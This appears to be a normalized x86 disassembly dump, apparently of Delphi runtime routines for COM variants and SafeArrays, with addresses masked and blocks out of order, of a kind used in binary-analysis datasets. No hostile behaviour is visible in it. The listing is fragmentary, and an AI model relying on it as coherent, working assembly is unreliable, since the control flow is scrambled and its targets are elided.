call sub_40ee88
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_4142a4
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f624
retn
call sub_40ed98
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f624
retn
call sub_40ed98
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f624
retn
call sub_40ed98
call sub_40ee88
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414811
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40fe90
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f624
retn
call sub_40ed98
sub_414850
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_414850
jmp r-xdata
call sub_4142a4
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_414850
jmp r-xdata
pop edi
pop esi
retn
call sub_414430
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_4142a4
jmp r-xdata
sub_414a3c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414b62
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_404174
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41670c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40442c
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_4086d4
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_40442c
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4032e0
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40294c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404384
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b69
lea eax [ ebp - 0x208 ]
call sub_404120
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40442c
sub_414bc0
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_414bb0
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_41670c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_414c80
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_414c54
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_404174
mov eax esi
mov edx ebx
call sub_412bb4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414cac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414cf5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404978
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_414d04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cfc
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_414d04
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_414c54
test al al
jne r-xdata
mov eax esi
mov edx edi
call sub_404868
mov eax esi
mov edx ebx
call sub_4132dc
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414d30
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_414bb0
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_414bb0
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_4168b4
sete al
xor eax eax
jmp r-xdata
sub_414dcc
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_414dcc
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_414e10
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
mov [ ebp - 0x2 ] cx
mov ebx edx
mov esi eax
test bl 0x1
je r-xdata
call sub_40efcc
cmp ebx 0x7f
jg r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
adc ebx 0x0
mov ax [ ebp - 0x2 ]
call sub_414fb8
test al al
jne r-xdata
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0x2 ]
push eax
call SafeArrayCreate
mov ebx eax
test ebx ebx
jne r-xdata
inc ebx
lea edx [ ebp - 0x208 ]
mov eax esi
inc ebx
sar ebx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
call sub_40f624
mov ax [ ebp - 0x2 ]
or ax 0x2000
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40efcc
mov ecx edx
mov esi [ eax ]
mov [ ecx + 0x4 ] esi
mov esi [ eax + 0x4 ]
sub esi [ ecx + 0x4 ]
inc esi
mov [ ecx ] esi
add eax 0x8
add edx 0x8
dec ebx
jne r-xdata
sub_414eb8
push ebx
add esp 0xfffffff8
mov ebx eax
mov ecx esp
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_414dcc
test al al
jne r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax 0x80070057
call sub_40f274
sub_414ee0
push ebx
add esp 0xfffffff8
mov ebx eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_414dcc
test al al
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_414f08
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_414eb8
push eax
call SafeArrayGetLBound
call sub_40f274
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_414f2c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push esi
mov eax ebx
call sub_414eb8
push eax
call SafeArrayGetUBound
call sub_40f274
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_414f50
push ebx
push ecx
mov ebx eax
push esp
mov eax ebx
call sub_414eb8
push eax
call SafeArrayAccessData
call sub_40f274
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414f90
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_414dcc
pop ecx
pop edx
retn
sub_414fd8
push ebx
push esi
mov ebx eax
movzx esi bx
and esi 0xffffbfff
mov eax esi
sub eax 0x16
jae r-xdata
mov eax ebx
call sub_414c34
test al al
jne r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 + 0x1 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_415014
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0xc ]
call sub_414dcc
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax 0x80070057
call sub_40f274
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4150d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40f274
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayGetElement
call sub_40f274
mov [ ebp - 0x10 ] bx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f274
mov eax [ ebp - 0x1c ]
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40f94c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_40f94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150db
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
sub_4150e0
push ebp
mov ebp esp
push ebx
mov ebx ecx
inc ebx
jle r-xdata
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_415014
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ edx + ecx * 4 ]
dec ecx
jns r-xdata
sub_415104
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x12 ]
mov eax [ ebp + 0x8 ]
call sub_414dcc
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x1a ]
mov eax esi
call sub_414dcc
test al al
jne r-xdata
mov eax 0x80070057
call sub_40f274
mov eax [ ebp - 0x18 ]
movzx eax [ eax ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ax [ ebp - 0x1a ]
call sub_414fd8
test al al
jne r-xdata
mov bx [ ebp - 0x12 ]
and bx 0xfff
movzx ebx bx
cmp ebx 0xc
jne r-xdata
mov eax 0x8002000b
call sub_40f274
cmp [ ebp - 0x1a ] 0x100
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41523c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xc
jne r-xdata
cmp [ ebp - 0x1a ] 0x100
jne r-xdata
mov eax 0x80020005
call sub_40f274
mov edx esi
lea eax [ ebp - 0x10 ]
mov ecx ebx
call sub_40fe90
add ebx 0xfffffff8
sub ebx 0x2
jb r-xdata
mov edx esi
lea eax [ ebp - 0x10 ]
call j_sub_40fbe0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f274
mov eax [ ebp - 0x24 ]
mov edx esi
call sub_40f94c
jmp r-xdata
mov ax [ ebp - 0x1a ]
call sub_414c34
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
sub ebx 0x3
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SafeArrayPutElement
call sub_40f274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40f624
retn
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
sub_41524c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
js r-xdata
mov ebx [ ebp + 0x8 ]
inc ebx
push ebx
push edx
push eax
call sub_415104
lea esp [ esp + ebx * 4 + 0xc ]
pop ebx
pop ebp
retn 0x4
push [ ecx + ebx * 4 ]
dec ebx
jns r-xdata
sub_415274
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi [ ebp + 0x8 ]
mov ebp eax
xor ebx ebx
test ecx ecx
jge r-xdata
xor eax eax
mov al [ edi + 0x1 ]
add edi eax
mov eax [ esi + ebx * 4 ]
mul [ edi + 0x2 ]
mov edi [ edi + 0x6 ]
test edi edi
je r-xdata
mov ebp [ ebp ]
add ebp eax
inc ebx
cmp ebx ecx
jle r-xdata
mov edi [ edi ]
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4152f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] 0x1
mov ebx eax
mov eax edx
call sub_4152d0
dec eax
test eax eax
jle r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] eax
dec [ esp + 0x4 ]
jne r-xdata
mov eax ebx
call sub_4152e8
mov esi eax
mov eax [ ebx ]
call sub_4152e8
mov ebp eax
dec esi
test esi esi
jle r-xdata
test ebx ebx
je r-xdata
mov ebx [ ebx ]
mov edi 0x1
inc edi
dec esi
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov eax [ ebx + edi * 4 ]
call sub_4152e8
cmp ebp eax
je r-xdata
sub_415358
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
call sub_4152d0
mov esi eax
push esi
mov eax ebp
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4152e8
dec eax
mov edx [ ebp ]
mov [ edx + edi * 4 ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
sub_4153ac
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ edi ]
call sub_4051d0
mov edx eax
test edx edx
jl r-xdata
test bl bl
je r-xdata
inc edx
xor eax eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
call sub_4051d0
cmp eax 0x0
jl r-xdata
inc eax
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov ecx [ edi ]
cmp [ ecx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
cmp [ edx + eax * 4 ] 0x0
je r-xdata
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 ] edx
dec eax
mov edx [ edi ]
dec [ edx + eax * 4 ]
jmp r-xdata
sub_415418
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi eax
mov eax edx
call sub_4152d0
mov ebp eax
mov eax ebp
add eax eax
push eax
mov eax edi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405384
add esp 0x4
xor ebx ebx
jmp r-xdata
mov eax ebp
add eax eax
cmp ebx eax
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ eax + ebx * 4 ] edx
inc ebx
test esi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov eax esi
call sub_4152e8
dec eax
mov edx [ edi ]
mov [ edx + ebx * 4 ] eax
mov esi [ esi ]
sub_415470
push ebx
mov ebx 0x1
test eax eax
je r-xdata
cmp ebx 0x1
jle r-xdata
cmp [ eax ] 0x11
jne r-xdata
call sub_40ed98
cmp ebx 0xe
je r-xdata
xor edx edx
mov dl [ eax + 0x1 ]
add eax edx
mov ebx [ eax + 0xa ]
cmp ebx 0x48
jne r-xdata
cmp ebx 0xf
je r-xdata
mov ebx 0x100
cmp ebx 0x14
jle r-xdata
mov eax ebx
pop ebx
retn
cmp ebx 0x100
je r-xdata
sub_4154b8
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4157fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4054a4
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_4054a4
mov eax [ ebp - 0x4 ]
call sub_40f624
mov ebx esi
mov eax ebx
call sub_415470
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x100
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x18 ] 0x8
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_415418
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax edi
call sub_415358
lea ecx [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_405390
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4051d0
mov edx eax
mov cx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_414e10
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40f94c
mov eax [ ebp - 0x4 ]
call sub_414f50
xor eax eax
push ebp
push sub_4157bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax edi
call sub_4152f0
test al al
je r-xdata
mov eax ebx
call sub_4152d0
dec eax
jle r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4153ac
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xb
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415801
lea eax [ ebp - 0x38 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404bd4
retn
push esi
mov eax [ ebp - 0x10 ]
call sub_4051d0
mov ecx eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_415274
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414f70
retn
cmp eax 0x12
jg r-xdata
je r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
mov dx [ ebx ]
neg dx
sbb edx edx
neg edx
call sub_413bfc
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0x4
call sub_413a2c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movzx edx [ ebx ]
mov cl 0x2
call sub_413a2c
jmp r-xdata
sub eax 0xc
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_4051d0
push eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41524c
lea eax [ ebp - 0x28 ]
call sub_40f624
jmp [ eax * 4 + jump_table_4155e8 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push edx
push eax
lea eax [ ebp - 0x28 ]
call sub_413b28
jmp r-xdata
sub eax 0xec
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_40f94c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xfe
call sub_413a2c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_413a2c
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413c24
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413c24
jmp r-xdata
fild [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413c4c
jmp r-xdata
fld [ ebx ]
lea eax [ ebp - 0x28 ]
call sub_413c24
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413cdc
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413d40
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
mov cl 0xfc
call sub_413a2c
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413c60
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x28 ]
mov edx [ ebx ]
call sub_413d14
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
movsx edx [ ebx ]
mov cl 0xff
call sub_413a2c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
xor edx edx
mov dl [ ebx ]
mov cl 0x1
call sub_413a2c
jmp r-xdata
jmp r-xdata
sub_415808
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_415b09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_414ee0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_414f50
xor edx edx
push ebp
push sub_415ad9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_4027b4
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
mov eax 0x80070057
call sub_40f274
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov ebx edi
mov edx ebx
call sub_4051f8
mov eax ebx
call sub_4152d0
mov eax ebx
call sub_415470
mov esi eax
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx edi
call sub_415358
lea ecx [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov eax [ ebp - 0x14 ]
call sub_405390
inc esi
xor ebx ebx
cmp eax 0x12
jg r-xdata
je r-xdata
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_414f2c
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x8 ]
call sub_414f08
pop edx
sub edx eax
inc edx
mov eax [ ebp - 0x10 ]
mov [ eax + ebx * 4 ] edx
inc ebx
dec esi
jne r-xdata
sub eax 0x13
je r-xdata
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_41165c
mov [ ebx ] ax
jmp r-xdata
cmp eax 0xa
ja r-xdata
lea eax [ ebp - 0x28 ]
call sub_410d18
mov [ ebx ] eax
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_410254
mov [ ebx ] ax
jmp r-xdata
sub eax 0xc
je r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4153ac
test al al
jne r-xdata
jmp [ eax * 4 + jump_table_415937 ]
lea eax [ ebp - 0x28 ]
call sub_410d18
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub eax 0xec
je r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_40f94c
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4051d0
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_4150e0
push edi
mov eax [ ebp - 0x18 ]
call sub_4051d0
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
call sub_415274
mov ebx eax
mov eax esi
cmp eax 0xb
jg r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ae0
mov eax [ ebp - 0x8 ]
call sub_414f70
retn
lea eax [ ebp - 0x28 ]
call sub_410254
mov [ ebx ] ax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_410254
mov [ ebx ] eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411ba4
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411ba4
fstp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_412500
fistp [ ebx ]
fwait
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_411ba4
fstp [ ebx ]
fwait
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_4132dc
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_413980
jmp r-xdata
lea eax [ ebp - 0x28 ]
call sub_410d18
mov [ ebx ] eax
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_412bb4
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x28 ]
call sub_4138b4
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_410254
mov [ ebx ] al
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_410254
mov [ ebx ] al
jmp r-xdata
jmp r-xdata
sub_415ae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415b10
lea eax [ ebp - 0x28 ]
call sub_40f638
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
